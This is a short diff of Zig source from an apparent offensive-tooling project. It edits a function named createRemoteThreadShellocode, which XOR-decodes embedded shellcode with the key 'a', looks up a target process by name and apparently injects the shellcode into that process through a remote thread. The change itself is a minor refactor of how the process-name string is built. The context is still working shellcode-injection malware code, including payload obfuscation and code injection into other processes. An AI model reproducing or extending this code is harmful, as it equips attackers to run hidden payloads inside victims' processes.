@@ -11,7 +11,6 @@ pub fn createRemoteThreadShellocode(
     processName: ?[]u8,
 ) anyerror!void {
     var processHandle: ?win.HANDLE = undefined;
-    var tmp: [1024]u8 = undefined;
     const allocator = std.heap.smp_allocator;
 
     const shellcode = try lib.xorSingleBytes(allocator, &cipherShellcode, 'a');
@@ -30,7 +29,7 @@ pub fn createRemoteThreadShellocode(
             return;
         }
     } else if (processName != null) {
-        const processNameString = try std.fmt.bufPrintZ(&tmp, "{s}", .{processName.?});
+        const processNameString = lib.convertToCString(processName.?);
         processHandle = win.GetHandleProcessByName(processNameString);
         if (processHandle == null) {
             logger.err("Failed to handle the process by name not found or not accesible", .{});
